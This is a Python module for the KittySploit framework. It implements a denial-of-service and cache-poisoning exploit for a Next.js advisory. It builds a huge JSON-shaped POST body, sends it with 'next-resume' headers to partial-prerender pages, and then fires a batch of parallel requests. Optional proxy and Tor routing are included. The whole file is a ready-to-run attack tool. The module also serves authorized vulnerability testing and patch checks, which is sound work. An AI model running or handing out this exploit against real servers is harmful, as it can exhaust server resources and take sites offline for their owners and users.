#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Next.js Next-Resume DoS / cache-poisoning (GHSA-mg66-mrh9-m8jx)",
        "description": (
            "POST a large text/plain JSON-shaped body with `next-resume: 1` and "
            "`x-next-resume-state-length: 1` to a PPR page. Pre-16.2.5 the renderer may accept the "
            "header and spend CPU/memory on resume. Builds a multi‑MiB body client-side — use only on "
            "systems you own."
        ),
        "author": ["KittySploit Team"],
        "references": ["https://github.com/advisories/GHSA-mg66-mrh9-m8jx"],
        "tags": ["http", "dos", "nextjs", "ppr", "resume", "ghsa"],
    }

    body_size_mb = OptInteger(15, "Approximate POST body size in MiB", required=False)
    concurrency = OptInteger(10, "Parallel resume POSTs after the first", required=False)
    post_timeout = OptInteger(120, "POST timeout (seconds)", required=False, advanced=True)
    check_body_mb = OptInteger(3, "Body size (MiB) for check() only", required=False, advanced=True)
    vulnerable_wall_seconds = OptFloat(2.0, "Wall time above = likely vulnerable", required=False, advanced=True)

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _url(self):
        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
        path = str(self.path).strip() or "/"
        if not path.startswith("/"):
            path = "/" + path
        return f"{proto}://{t}:{p}{path}"

    def _verify_proxies(self):
        verify = self._to_bool(self._o(self.verify_ssl))
        px = str(self._o(self.proxy) or "").strip()
        proxies = {}
        if px:
            proxies = {"http": px, "https": px}
        elif self.framework and getattr(self.framework, "is_tor_enabled", lambda: False)():
            tor = self.framework.tor_manager.get_tor_proxy_dict()
            if tor:
                proxies = tor
        elif self.framework and getattr(self.framework, "is_proxy_enabled", lambda: False)():
            u = self.framework.get_proxy_url()
            if u:
                proxies = {"http": u, "https": u, "all": u}
        return verify, proxies or None

    @staticmethod
    def _build_json_huge(size_mb: int) -> bytes:
        target = max(1, int(size_mb)) * 1024 * 1024
        chunk = b'"X"' + b',"X"' * 10_000
        parts = [b"[", chunk]
        size = sum(len(x) for x in parts)
        while size < target:
            parts.append(b"," + chunk)
            size += len(chunk) + 1
        parts.append(b"]")
        return b"".join(parts)

    def _resume_headers(self):
        self._configure_session()
        h = {str(k): str(v) for k, v in self.session.headers.items()}
        h.update(
            {
                "next-resume": "1",
                "x-next-resume-state-length": "1",
                "Content-Type": "text/plain",
            }
        )
        return h

    def _post_resume(self, body: bytes, timeout: float, headers: dict = None):
        verify, proxies = self._verify_proxies()
        hdr = headers if headers is not None else self._resume_headers()
        t0 = time.perf_counter()
        try:
            r = requests.post(
                self._url(),
                data=body,
                headers=hdr,
                timeout=timeout,
                verify=verify,
                proxies=proxies,
            )
            return r.status_code, time.perf_counter() - t0, None
        except requests.RequestException as e:
            return -1, time.perf_counter() - t0, str(e)

    def _baseline_get(self):
        verify, proxies = self._verify_proxies()
        t0 = time.perf_counter()
        try:
            self._configure_session()
            r = self.session.get(self._url(), timeout=float(self._o(self.timeout)), verify=verify, proxies=proxies)
            return r.status_code, time.perf_counter() - t0, None
        except requests.RequestException as e:
            return -1, time.perf_counter() - t0, str(e)

    def _signal(self, code: int, wall: float, err) -> bool:
        if err and "Connection" in err:
            return False
        thr = float(self._o(self.vulnerable_wall_seconds))
        if wall > thr:
            return True
        if code in (413, 500, 502):
            return True
        return False

    def check(self):
        bc, bw, be = self._baseline_get()
        if be and "Connection" in str(be):
            return {"vulnerable": False, "reason": f"Baseline unreachable: {be}", "confidence": "high"}
        mb = max(1, int(self._o(self.check_body_mb)))
        body = self._build_json_huge(mb)
        to = min(90.0, float(self._o(self.post_timeout)))
        c, w, e = self._post_resume(body, to)
        if e and "Connection" in str(e):
            return {"vulnerable": False, "reason": f"POST unreachable: {e}", "confidence": "high"}
        hit = self._signal(c, w, e)
        return {
            "vulnerable": hit,
            "reason": f"resume POST HTTP {c} wall={w:.2f}s" + (f" err={e}" if e else ""),
            "confidence": "medium" if hit else "low",
            "baseline": {"code": bc, "wall": bw},
            "probe": {"http_code": c, "wall_seconds": w, "body_bytes": len(body), "error": e},
        }

    def run(self) -> bool:
        mb = max(1, int(self._o(self.body_size_mb)))
        conc = max(1, int(self._o(self.concurrency)))
        pto = float(self._o(self.post_timeout))

        print_info(f"Target: {self._url()}")
        print_status("Baseline GET …")
        bc, bw, be = self._baseline_get()
        print_status(f"  HTTP {bc}  wall={bw:.2f}s  err={be}")

        print_status(f"Building ~{mb} MiB body …")
        body = self._build_json_huge(mb)
        print_status(f"  length = {len(body):,} bytes")

        print_status("Single next-resume POST …")
        hdr = self._resume_headers()
        c, w, e = self._post_resume(body, pto, hdr)
        print_status(f"  HTTP {c}  wall={w:.2f}s  err={e}")
        if e and "Connection" in str(e):
            print_error("Unreachable.")
            return False

        vuln = self._signal(c, w, e)
        if vuln:
            print_error(f"DoS / resume signal (wall={w:.2f}s, HTTP {c}).")
        else:
            print_warning("No strong signal — likely patched or route not PPR.")

        print_status(f"{conc} parallel resume POSTs …")
        t0 = time.perf_counter()
        with ThreadPoolExecutor(max_workers=conc) as pool:
            futs = [pool.submit(self._post_resume, body, pto, hdr) for _ in range(conc)]
            done = [f.result() for f in as_completed(futs)]
        walls = [x[1] for x in done]
        print_status(
            f"  total wall {time.perf_counter() - t0:.2f}s  avg {sum(walls) / max(1, len(walls)):.2f}s  "
            f"codes {[x[0] for x in done]}"
        )
        return bool(vuln)
